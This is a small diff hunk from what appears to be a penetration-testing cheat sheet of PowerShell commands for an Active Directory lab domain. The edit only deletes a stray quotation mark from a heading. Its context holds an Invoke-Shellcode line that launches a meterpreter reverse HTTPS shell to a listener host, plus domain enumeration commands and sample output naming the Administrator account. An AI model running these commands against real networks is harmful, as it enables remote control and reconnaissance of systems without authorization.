@@ -76,7 +76,7 @@ Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.10 
  * **Output**:
    * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>distinguishedName : CN=Administrator,CN=Users,DC=pwnt,DC=com<br>name              : Administrator<br>objectClass       : user<br>objectGUID        : 1fd60ff8-07a4-4c6e-9a1e-7cd0d7bb97db<br>SamAccountName    : Administrator<br>SID               : S-1-5-21-2027135834-1792351174-2509185371-500</code></div> 
    
- ### Enumerate All Servers on Domain" 
+ ### Enumerate All Servers on Domain 
  * **Command with arguments**: `Get-ADComputer -Credential $cred -server pwnt.com -LDAPFilter "(&(objectCategory=computer)(opera
 tingSystem=*Server*))" |select name`
  * **Output**:
